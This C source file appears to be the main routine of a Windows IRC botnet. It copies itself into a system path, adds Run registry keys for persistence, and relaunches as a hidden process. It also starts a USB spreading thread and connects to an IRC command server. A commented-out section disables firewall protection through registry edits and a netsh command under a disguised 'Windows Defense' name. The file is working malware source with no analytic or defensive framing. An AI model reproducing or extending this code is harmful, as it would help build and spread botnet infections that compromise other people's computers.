#include "includes.h"
#include "config.h"

HANDLE xetum;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
{
	
	SetErrorMode(SEM_NOGPFAULTERRORBOX);

	Sleep(2000);

    //mutex-check
	
	xetum = CreateMutex(NULL, FALSE, cfg_mutex);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);//End of muteX-check

	//install
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,exename);

	if (MoveBot(movetopath,exename))
	{
		HKEY hndKey;
		hndKey= NULL;//Write Registry Key
		RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
		RegSetValueEx(hndKey,szRegname,0, REG_SZ,(const unsigned char *)spath,strlen(spath));
		RegCloseKey(hndKey);//End of registry key
		
		HKEY hKey;
		hKey= NULL;//Write Registry Key
		RegCreateKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hKey, NULL);
		RegSetValueEx(hKey,szRegname,0, REG_SZ,(const unsigned char *)spath,strlen(spath));
		RegCloseKey(hKey);//End of registry key
		
		//HKEY hndhKey = NULL;
		//Firewall bypass
		/*char pfad[256];
		char* szRegname = "Windows Defense";
		_snprintf(pfad, sizeof(pfad),"%s:*:Enabled:%s", spath, szRegname);
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hndhKey, 0);
		RegSetValueEx(hndhKey, spath, 0, REG_SZ, (const unsigned char *)pfad, strlen(pfad));
		RegCloseKey(hndhKey);//end of fwb
		
		char fbyp[256];//Secondary Fwb
		_snprintf(fbyp, sizeof(fbyp),"netsh firewall add allowedprogram %s WindowsSafety ENABLE",spath);
		fwlbypass(fbyp);//end of secondary Fwb*/
		
		//FWB Not needed.
		
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;

		sinfo.wShowWindow = SW_HIDE;

		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			WSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}

		ExitProcess(1);
	}
	
	
	//USB Thread
	NTHREAD usb;
	DWORD id;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USB_Spreader, &usb, 0, &id);
	//USB Thread end
	
	
	//Initialization of the bot.(Connection to Server)
	char test[1] = "";
	IRC_Thread((void*)test);
	//End of connection starter.

	
	
	return(0);//End of Program(Unreachable.)[Has to return a value.]

}
